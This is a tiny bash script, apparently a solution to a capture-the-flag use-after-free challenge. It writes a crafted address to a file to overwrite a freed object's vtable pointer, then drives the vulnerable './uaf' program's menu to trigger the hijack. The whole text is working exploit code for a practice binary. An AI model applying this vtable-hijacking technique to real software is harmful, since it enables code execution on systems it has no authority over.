#!/bin/bash

# change offset of vtable
echo -ne '\x68\x15\x40\x00\x00\x00\x00\x00' > ./addr
(echo "3 2 2 1"; cat) | ./uaf 8 ./addr
